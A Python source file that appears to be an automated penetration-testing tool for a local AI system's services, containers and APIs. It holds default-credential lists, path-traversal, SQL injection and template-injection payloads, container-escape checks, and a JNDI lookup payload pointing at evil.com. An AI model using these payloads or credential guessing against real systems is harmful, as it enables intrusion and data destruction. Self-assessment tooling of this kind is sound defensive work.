#!/usr/bin/env python3
"""
Archangel Penetration Testing Framework
Automated penetration testing for the autonomous AI system components
"""

import asyncio
import json
import logging
import subprocess
import socket
import requests
import docker
import redis
import pymongo
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from pathlib import Path
import yaml
import time
import threading
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@dataclass
class PenetrationTestResult:
    """Result of a penetration test"""
    test_name: str
    target: str
    success: bool
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    evidence: Dict[str, Any]
    remediation: str
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

@dataclass
class PenTestReport:
    """Complete penetration test report"""
    test_id: str
    timestamp: datetime
    results: List[PenetrationTestResult]
    summary: Dict[str, int]
    attack_paths: List[str]
    recommendations: List[str]

class NetworkPenetrationTester:
    """Network-focused penetration testing"""
    
    def __init__(self):
        self.results = []
    
    async def test_network_services(self) -> List[PenetrationTestResult]:
        """Test network services for vulnerabilities"""
        results = []
        
        # Common ports used by Archangel components
        target_ports = {
            22: 'SSH',
            80: 'HTTP',
            443: 'HTTPS',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            9200: 'Elasticsearch',
            5601: 'Kibana',
            3000: 'Grafana',
            9090: 'Prometheus',
            8080: 'Application Server',
            5000: 'Agent API'
        }
        
        for port, service in target_ports.items():
            result = await self._test_port_service(port, service)
            if result:
                results.append(result)
        
        return results
    
    async def _test_port_service(self, port: int, service: str) -> Optional[PenetrationTestResult]:
        """Test a specific port/service"""
        try:
            # Test if port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex(('localhost', port))
            sock.close()
            
            if result != 0:
                return None  # Port closed
            
            # Port is open, perform service-specific tests
            if service == 'SSH':
                return await self._test_ssh_service(port)
            elif service in ['HTTP', 'HTTPS']:
                return await self._test_web_service(port, service)
            elif service == 'Redis':
                return await self._test_redis_service(port)
            elif service in ['MySQL', 'PostgreSQL']:
                return await self._test_database_service(port, service)
            else:
                return PenetrationTestResult(
                    test_name=f"{service} Service Detection",
                    target=f"localhost:{port}",
                    success=True,
                    severity="INFO",
                    description=f"{service} service detected on port {port}",
                    evidence={'port': port, 'service': service},
                    remediation="Ensure service is properly secured and configured"
                )
                
        except Exception as e:
            logger.debug(f"Port test failed for {port}: {e}")
            return None
    
    async def _test_ssh_service(self, port: int) -> PenetrationTestResult:
        """Test SSH service for common vulnerabilities"""
        try:
            # Test for weak authentication
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Common weak credentials
            weak_creds = [
                ('root', 'root'),
                ('admin', 'admin'),
                ('admin', 'password'),
                ('user', 'user'),
                ('test', 'test')
            ]
            
            for username, password in weak_creds:
                try:
                    ssh.connect('localhost', port=port, username=username, 
                              password=password, timeout=5)
                    ssh.close()
                    
                    return PenetrationTestResult(
                        test_name="SSH Weak Credentials",
                        target=f"localhost:{port}",
                        success=True,
                        severity="CRITICAL",
                        description=f"SSH allows login with weak credentials: {username}/{password}",
                        evidence={'username': username, 'password': password},
                        remediation="Disable password authentication, use key-based auth only"
                    )
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception:
                    break
            
            return PenetrationTestResult(
                test_name="SSH Security Test",
                target=f"localhost:{port}",
                success=False,
                severity="INFO",
                description="SSH service appears to be properly secured",
                evidence={'port': port},
                remediation="Continue monitoring SSH access patterns"
            )
            
        except ImportError:
            return PenetrationTestResult(
                test_name="SSH Test Skipped",
                target=f"localhost:{port}",
                success=False,
                severity="INFO",
                description="SSH testing requires paramiko library",
                evidence={'port': port},
                remediation="Install paramiko for SSH security testing"
            )
        except Exception as e:
            logger.debug(f"SSH test failed: {e}")
            return None
    
    async def _test_web_service(self, port: int, service: str) -> PenetrationTestResult:
        """Test web service for common vulnerabilities"""
        try:
            protocol = 'https' if service == 'HTTPS' else 'http'
            base_url = f"{protocol}://localhost:{port}"
            
            # Test for common vulnerabilities
            session = requests.Session()
            session.verify = False  # For testing self-signed certs
            
            # Test for directory traversal
            traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd'
            ]
            
            for payload in traversal_payloads:
                try:
                    response = session.get(f"{base_url}/{payload}", timeout=5)
                    if 'root:' in response.text or 'localhost' in response.text:
                        return PenetrationTestResult(
                            test_name="Directory Traversal",
                            target=base_url,
                            success=True,
                            severity="HIGH",
                            description=f"Directory traversal vulnerability detected with payload: {payload}",
                            evidence={'payload': payload, 'response_snippet': response.text[:200]},
                            remediation="Implement proper input validation and path sanitization"
                        )
                except requests.RequestException:
                    continue
            
            # Test for SQL injection in common parameters
            sqli_payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "1' UNION SELECT NULL,NULL,NULL--"
            ]
            
            common_params = ['id', 'user', 'search', 'q', 'name']
            
            for param in common_params:
                for payload in sqli_payloads:
                    try:
                        response = session.get(f"{base_url}/", 
                                             params={param: payload}, timeout=5)
                        
                        # Look for SQL error messages
                        sql_errors = ['mysql', 'postgresql', 'sqlite', 'syntax error', 'ORA-']
                        if any(error in response.text.lower() for error in sql_errors):
                            return PenetrationTestResult(
                                test_name="SQL Injection",
                                target=base_url,
                                success=True,
                                severity="CRITICAL",
                                description=f"SQL injection vulnerability in parameter: {param}",
                                evidence={'parameter': param, 'payload': payload},
                                remediation="Use parameterized queries and input validation"
                            )
                    except requests.RequestException:
                        continue
            
            # Test for default credentials on admin panels
            admin_paths = ['/admin', '/administrator', '/wp-admin', '/login']
            for path in admin_paths:
                try:
                    response = session.get(f"{base_url}{path}", timeout=5)
                    if response.status_code == 200 and 'login' in response.text.lower():
                        # Try default credentials
                        login_data = {'username': 'admin', 'password': 'admin'}
                        login_response = session.post(f"{base_url}{path}", 
                                                    data=login_data, timeout=5)
                        
                        if login_response.status_code == 200 and 'dashboard' in login_response.text.lower():
                            return PenetrationTestResult(
                                test_name="Default Admin Credentials",
                                target=f"{base_url}{path}",
                                success=True,
                                severity="CRITICAL",
                                description="Admin panel accessible with default credentials",
                                evidence={'path': path, 'credentials': 'admin/admin'},
                                remediation="Change default credentials and implement strong authentication"
                            )
                except requests.RequestException:
                    continue
            
            return PenetrationTestResult(
                test_name="Web Service Security Test",
                target=base_url,
                success=False,
                severity="INFO",
                description="Web service appears to be properly secured",
                evidence={'port': port, 'service': service},
                remediation="Continue monitoring for new vulnerabilities"
            )
            
        except Exception as e:
            logger.debug(f"Web service test failed: {e}")
            return None
    
    async def _test_redis_service(self, port: int) -> PenetrationTestResult:
        """Test Redis service for security issues"""
        try:
            # Test for unauthenticated access
            r = redis.Redis(host='localhost', port=port, socket_timeout=5)
            
            # Try to get server info
            info = r.info()
            
            return PenetrationTestResult(
                test_name="Redis Unauthenticated Access",
                target=f"localhost:{port}",
                success=True,
                severity="HIGH",
                description="Redis server allows unauthenticated access",
                evidence={'redis_version': info.get('redis_version', 'unknown')},
                remediation="Enable Redis authentication and bind to localhost only"
            )
            
        except redis.AuthenticationError:
            return PenetrationTestResult(
                test_name="Redis Authentication Test",
                target=f"localhost:{port}",
                success=False,
                severity="INFO",
                description="Redis properly requires authentication",
                evidence={'port': port},
                remediation="Ensure strong Redis password is configured"
            )
        except Exception as e:
            logger.debug(f"Redis test failed: {e}")
            return None
    
    async def _test_database_service(self, port: int, service: str) -> PenetrationTestResult:
        """Test database service for security issues"""
        try:
            if service == 'MySQL':
                import pymysql
                
                # Test for weak credentials
                weak_creds = [
                    ('root', ''),
                    ('root', 'root'),
                    ('admin', 'admin'),
                    ('mysql', 'mysql')
                ]
                
                for username, password in weak_creds:
                    try:
                        connection = pymysql.connect(
                            host='localhost',
                            port=port,
                            user=username,
                            password=password,
                            connect_timeout=5
                        )
                        connection.close()
                        
                        return PenetrationTestResult(
                            test_name="MySQL Weak Credentials",
                            target=f"localhost:{port}",
                            success=True,
                            severity="CRITICAL",
                            description=f"MySQL allows login with weak credentials: {username}/{password}",
                            evidence={'username': username, 'password': password},
                            remediation="Set strong passwords for all database users"
                        )
                        
                    except pymysql.Error:
                        continue
            
            elif service == 'PostgreSQL':
                import psycopg2
                
                # Test for weak credentials
                weak_creds = [
                    ('postgres', ''),
                    ('postgres', 'postgres'),
                    ('admin', 'admin')
                ]
                
                for username, password in weak_creds:
                    try:
                        connection = psycopg2.connect(
                            host='localhost',
                            port=port,
                            user=username,
                            password=password,
                            connect_timeout=5
                        )
                        connection.close()
                        
                        return PenetrationTestResult(
                            test_name="PostgreSQL Weak Credentials",
                            target=f"localhost:{port}",
                            success=True,
                            severity="CRITICAL",
                            description=f"PostgreSQL allows login with weak credentials: {username}/{password}",
                            evidence={'username': username, 'password': password},
                            remediation="Set strong passwords for all database users"
                        )
                        
                    except psycopg2.Error:
                        continue
            
            return PenetrationTestResult(
                test_name=f"{service} Security Test",
                target=f"localhost:{port}",
                success=False,
                severity="INFO",
                description=f"{service} appears to be properly secured",
                evidence={'port': port, 'service': service},
                remediation="Continue monitoring database access patterns"
            )
            
        except ImportError:
            return PenetrationTestResult(
                test_name=f"{service} Test Skipped",
                target=f"localhost:{port}",
                success=False,
                severity="INFO",
                description=f"{service} testing requires appropriate Python library",
                evidence={'port': port},
                remediation=f"Install appropriate library for {service} security testing"
            )
        except Exception as e:
            logger.debug(f"Database test failed: {e}")
            return None

class ContainerPenetrationTester:
    """Container-focused penetration testing"""
    
    def __init__(self):
        self.docker_client = docker.from_env()
        self.results = []
    
    async def test_container_security(self) -> List[PenetrationTestResult]:
        """Test container security configurations"""
        results = []
        
        # Test container escape techniques
        escape_results = await self._test_container_escapes()
        results.extend(escape_results)
        
        # Test privilege escalation
        privesc_results = await self._test_privilege_escalation()
        results.extend(privesc_results)
        
        # Test inter-container communication
        icc_results = await self._test_inter_container_communication()
        results.extend(icc_results)
        
        return results
    
    async def _test_container_escapes(self) -> List[PenetrationTestResult]:
        """Test various container escape techniques"""
        results = []
        
        escape_techniques = [
            {
                'name': 'Docker Socket Mount',
                'command': 'docker ps',
                'mount': {'/var/run/docker.sock': {'bind': '/var/run/docker.sock', 'mode': 'rw'}},
                'severity': 'CRITICAL'
            },
            {
                'name': 'Privileged Container',
                'command': 'mount -t proc proc /proc',
                'privileged': True,
                'severity': 'CRITICAL'
            },
            {
                'name': 'Host PID Namespace',
                'command': 'ps aux | grep -v grep | wc -l',
                'pid_mode': 'host',
                'severity': 'HIGH'
            }
        ]
        
        for technique in escape_techniques:
            try:
                container_kwargs = {
                    'image': 'alpine:latest',
                    'command': f"sh -c '{technique['command']}'",
                    'remove': True,
                    'detach': False
                }
                
                # Add technique-specific parameters
                if 'mount' in technique:
                    container_kwargs['volumes'] = technique['mount']
                if 'privileged' in technique:
                    container_kwargs['privileged'] = technique['privileged']
                if 'pid_mode' in technique:
                    container_kwargs['pid_mode'] = technique['pid_mode']
                
                result = self.docker_client.containers.run(**container_kwargs)
                
                # If command succeeds, escape technique works
                if result:
                    results.append(PenetrationTestResult(
                        test_name=f"Container Escape: {technique['name']}",
                        target="Container Runtime",
                        success=True,
                        severity=technique['severity'],
                        description=f"Container escape possible via {technique['name']}",
                        evidence={'technique': technique['name'], 'output': result.decode()[:200]},
                        remediation="Remove dangerous container configurations and implement proper isolation"
                    ))
                    
            except docker.errors.APIError as e:
                # Expected - escape should be blocked
                logger.debug(f"Container escape test blocked (expected): {e}")
            except Exception as e:
                logger.debug(f"Container escape test failed: {e}")
        
        return results
    
    async def _test_privilege_escalation(self) -> List[PenetrationTestResult]:
        """Test privilege escalation within containers"""
        results = []
        
        privesc_tests = [
            {
                'name': 'SUID Binary Abuse',
                'command': 'find / -perm -4000 2>/dev/null | head -10',
                'severity': 'MEDIUM'
            },
            {
                'name': 'Sudo Configuration',
                'command': 'sudo -l 2>/dev/null || echo "sudo not available"',
                'severity': 'HIGH'
            },
            {
                'name': 'Capabilities Check',
                'command': 'capsh --print 2>/dev/null || echo "capsh not available"',
                'severity': 'MEDIUM'
            }
        ]
        
        for test in privesc_tests:
            try:
                result = self.docker_client.containers.run(
                    'alpine:latest',
                    command=f"sh -c '{test['command']}'",
                    remove=True,
                    user='1000:1000'  # Non-root user
                )
                
                output = result.decode()
                
                # Analyze output for privilege escalation opportunities
                if test['name'] == 'SUID Binary Abuse' and '/bin/' in output:
                    results.append(PenetrationTestResult(
                        test_name=test['name'],
                        target="Container Environment",
                        success=True,
                        severity=test['severity'],
                        description="SUID binaries found that could be abused for privilege escalation",
                        evidence={'suid_binaries': output.strip()},
                        remediation="Remove unnecessary SUID binaries from container images"
                    ))
                elif test['name'] == 'Sudo Configuration' and 'NOPASSWD' in output:
                    results.append(PenetrationTestResult(
                        test_name=test['name'],
                        target="Container Environment",
                        success=True,
                        severity=test['severity'],
                        description="Passwordless sudo configuration detected",
                        evidence={'sudo_config': output.strip()},
                        remediation="Remove or restrict sudo access in containers"
                    ))
                    
            except docker.errors.ContainerError:
                # Expected for some tests
                pass
            except Exception as e:
                logger.debug(f"Privilege escalation test failed: {e}")
        
        return results
    
    async def _test_inter_container_communication(self) -> List[PenetrationTestResult]:
        """Test inter-container communication restrictions"""
        results = []
        
        try:
            # Create test network
            test_network = self.docker_client.networks.create(
                "pentest_network",
                driver="bridge"
            )
            
            try:
                # Start target container
                target_container = self.docker_client.containers.run(
                    'alpine:latest',
                    command='nc -l -p 8080',
                    network=test_network.name,
                    detach=True,
                    remove=True
                )
                
                time.sleep(2)  # Wait for container to start
                
                # Get target IP
                target_container.reload()
                target_ip = target_container.attrs['NetworkSettings']['Networks'][test_network.name]['IPAddress']
                
                # Test connection from another container
                result = self.docker_client.containers.run(
                    'alpine:latest',
                    command=f'nc -z -w 3 {target_ip} 8080',
                    network=test_network.name,
                    remove=True
                )
                
                # If connection succeeds, inter-container communication is possible
                results.append(PenetrationTestResult(
                    test_name="Inter-Container Communication",
                    target="Container Network",
                    success=True,
                    severity="MEDIUM",
                    description="Containers can communicate freely within the same network",
                    evidence={'target_ip': target_ip, 'port': 8080},
                    remediation="Implement network policies to restrict inter-container communication"
                ))
                
                # Clean up
                target_container.stop()
                
            finally:
                test_network.remove()
                
        except Exception as e:
            logger.debug(f"Inter-container communication test failed: {e}")
        
        return results

class ApplicationPenetrationTester:
    """Application-specific penetration testing for Archangel components"""
    
    def __init__(self):
        self.results = []
    
    async def test_agent_apis(self) -> List[PenetrationTestResult]:
        """Test agent API endpoints for vulnerabilities"""
        results = []
        
        # Common agent API endpoints
        api_endpoints = [
            '/api/agents',
            '/api/agents/status',
            '/api/agents/commands',
            '/api/memory',
            '/api/scenarios',
            '/api/scoring'
        ]
        
        base_urls = [
            'http://localhost:5000',
            'http://localhost:8080',
            'http://localhost:3000'
        ]
        
        for base_url in base_urls:
            for endpoint in api_endpoints:
                result = await self._test_api_endpoint(base_url, endpoint)
                if result:
                    results.append(result)
        
        return results
    
    async def _test_api_endpoint(self, base_url: str, endpoint: str) -> Optional[PenetrationTestResult]:
        """Test a specific API endpoint"""
        try:
            session = requests.Session()
            
            # Test for unauthenticated access
            response = session.get(f"{base_url}{endpoint}", timeout=5)
            
            if response.status_code == 200:
                # Check if sensitive data is exposed
                response_text = response.text.lower()
                sensitive_keywords = ['password', 'secret', 'key', 'token', 'credential']
                
                if any(keyword in response_text for keyword in sensitive_keywords):
                    return PenetrationTestResult(
                        test_name="API Information Disclosure",
                        target=f"{base_url}{endpoint}",
                        success=True,
                        severity="HIGH",
                        description="API endpoint exposes sensitive information without authentication",
                        evidence={'endpoint': endpoint, 'response_length': len(response.text)},
                        remediation="Implement proper authentication and data filtering"
                    )
                
                # Test for injection vulnerabilities
                injection_payloads = [
                    "'; DROP TABLE agents; --",
                    "<script>alert('xss')</script>",
                    "{{7*7}}",
                    "${jndi:ldap://evil.com/a}"
                ]
                
                for payload in injection_payloads:
                    try:
                        inj_response = session.post(
                            f"{base_url}{endpoint}",
                            json={'data': payload},
                            timeout=5
                        )
                        
                        if payload in inj_response.text or '49' in inj_response.text:
                            return PenetrationTestResult(
                                test_name="API Injection Vulnerability",
                                target=f"{base_url}{endpoint}",
                                success=True,
                                severity="CRITICAL",
                                description=f"API endpoint vulnerable to injection: {payload}",
                                evidence={'payload': payload, 'endpoint': endpoint},
                                remediation="Implement proper input validation and sanitization"
                            )
                    except requests.RequestException:
                        continue
            
            elif response.status_code == 401:
                # Good - authentication required
                return PenetrationTestResult(
                    test_name="API Authentication Check",
                    target=f"{base_url}{endpoint}",
                    success=False,
                    severity="INFO",
                    description="API endpoint properly requires authentication",
                    evidence={'endpoint': endpoint, 'status_code': 401},
                    remediation="Ensure authentication mechanism is robust"
                )
            
        except requests.RequestException:
            # Service not available
            return None
        except Exception as e:
            logger.debug(f"API endpoint test failed: {e}")
            return None
        
        return None

class PenetrationTestOrchestrator:
    """Main orchestrator for penetration testing"""
    
    def __init__(self):
        self.testers = {
            'network': NetworkPenetrationTester(),
            'container': ContainerPenetrationTester(),
            'application': ApplicationPenetrationTester()
        }
    
    async def run_penetration_tests(self) -> PenTestReport:
        """Run comprehensive penetration tests"""
        logger.info("Starting penetration testing...")
        
        test_id = f"pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        all_results = []
        
        # Run all testers
        for tester_name, tester in self.testers.items():
            logger.info(f"Running {tester_name} penetration tests...")
            
            try:
                if tester_name == 'network':
                    results = await tester.test_network_services()
                elif tester_name == 'container':
                    results = await tester.test_container_security()
                elif tester_name == 'application':
                    results = await tester.test_agent_apis()
                
                all_results.extend(results)
                logger.info(f"Completed {tester_name} tests: {len(results)} results")
                
            except Exception as e:
                logger.error(f"Penetration tester {tester_name} failed: {e}")
        
        # Generate summary and analysis
        summary = self._generate_summary(all_results)
        attack_paths = self._identify_attack_paths(all_results)
        recommendations = self._generate_recommendations(all_results)
        
        report = PenTestReport(
            test_id=test_id,
            timestamp=datetime.now(),
            results=all_results,
            summary=summary,
            attack_paths=attack_paths,
            recommendations=recommendations
        )
        
        logger.info(f"Penetration testing completed: {len(all_results)} total results")
        return report
    
    def _generate_summary(self, results: List[PenetrationTestResult]) -> Dict[str, int]:
        """Generate test results summary"""
        summary = {
            'total_tests': len(results),
            'successful_exploits': len([r for r in results if r.success]),
            'by_severity': {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        }
        
        for result in results:
            if result.success:
                summary['by_severity'][result.severity] += 1
        
        return summary
    
    def _identify_attack_paths(self, results: List[PenetrationTestResult]) -> List[str]:
        """Identify potential attack paths from successful exploits"""
        attack_paths = []
        
        successful_exploits = [r for r in results if r.success and r.severity in ['CRITICAL', 'HIGH']]
        
        # Group by target/component
        by_target = {}
        for exploit in successful_exploits:
            if exploit.target not in by_target:
                by_target[exploit.target] = []
            by_target[exploit.target].append(exploit)
        
        # Generate attack path descriptions
        for target, exploits in by_target.items():
            if len(exploits) > 1:
                exploit_names = [e.test_name for e in exploits]
                attack_paths.append(
                    f"Multiple vulnerabilities in {target}: {', '.join(exploit_names)}"
                )
            else:
                attack_paths.append(
                    f"Critical vulnerability in {target}: {exploits[0].test_name}"
                )
        
        # Add chaining opportunities
        container_exploits = [r for r in successful_exploits if 'container' in r.test_name.lower()]
        network_exploits = [r for r in successful_exploits if 'network' in r.test_name.lower()]
        
        if container_exploits and network_exploits:
            attack_paths.append(
                "Potential attack chain: Network exploitation → Container escape → Host compromise"
            )
        
        return attack_paths
    
    def _generate_recommendations(self, results: List[PenetrationTestResult]) -> List[str]:
        """Generate security recommendations based on test results"""
        recommendations = []
        
        successful_exploits = [r for r in results if r.success]
        
        # Count by severity
        critical_count = len([r for r in successful_exploits if r.severity == 'CRITICAL'])
        high_count = len([r for r in successful_exploits if r.severity == 'HIGH'])
        
        if critical_count > 0:
            recommendations.append(
                f"URGENT: Address {critical_count} critical vulnerabilities immediately"
            )
        
        if high_count > 0:
            recommendations.append(
                f"HIGH PRIORITY: Remediate {high_count} high-severity vulnerabilities"
            )
        
        # Category-specific recommendations
        exploit_types = [r.test_name for r in successful_exploits]
        
        if any('credential' in t.lower() for t in exploit_types):
            recommendations.append(
                "Implement strong authentication: disable default credentials, enforce strong passwords"
            )
        
        if any('injection' in t.lower() for t in exploit_types):
            recommendations.append(
                "Implement input validation: use parameterized queries, sanitize user input"
            )
        
        if any('container' in t.lower() for t in exploit_types):
            recommendations.append(
                "Harden container security: remove privileged access, implement proper isolation"
            )
        
        if any('network' in t.lower() for t in exploit_types):
            recommendations.append(
                "Strengthen network security: implement segmentation, restrict inter-service communication"
            )
        
        return recommendations
    
    def save_pentest_report(self, report: PenTestReport, output_path: str = None) -> str:
        """Save penetration test report to file"""
        if output_path is None:
            output_path = f"penetration_test_report_{report.test_id}.json"
        
        # Convert to serializable format
        report_data = {
            'test_id': report.test_id,
            'timestamp': report.timestamp.isoformat(),
            'summary': report.summary,
            'attack_paths': report.attack_paths,
            'recommendations': report.recommendations,
            'results': [asdict(result) for result in report.results]
        }
        
        # Convert datetime objects in results
        for result in report_data['results']:
            if 'timestamp' in result and result['timestamp']:
                result['timestamp'] = result['timestamp'].isoformat()
        
        with open(output_path, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
        
        logger.info(f"Penetration test report saved to: {output_path}")
        return output_path

async def main():
    """Main entry point for penetration testing"""
    orchestrator = PenetrationTestOrchestrator()
    
    try:
        # Run penetration tests
        report = await orchestrator.run_penetration_tests()
        
        # Save report
        report_path = orchestrator.save_pentest_report(report)
        
        # Print summary
        print("\n" + "="*60)
        print("PENETRATION TEST SUMMARY")
        print("="*60)
        print(f"Test ID: {report.test_id}")
        print(f"Timestamp: {report.timestamp}")
        print(f"Total Tests: {report.summary['total_tests']}")
        print(f"Successful Exploits: {report.summary['successful_exploits']}")
        
        print("\nExploits by Severity:")
        for severity, count in report.summary['by_severity'].items():
            if count > 0:
                print(f"  {severity}: {count}")
        
        if report.attack_paths:
            print("\nIdentified Attack Paths:")
            for i, path in enumerate(report.attack_paths, 1):
                print(f"  {i}. {path}")
        
        print("\nTop Recommendations:")
        for i, rec in enumerate(report.recommendations[:3], 1):
            print(f"  {i}. {rec}")
        
        print(f"\nDetailed report saved to: {report_path}")
        print("="*60)
        
        return report
        
    except Exception as e:
        logger.error(f"Penetration testing failed: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())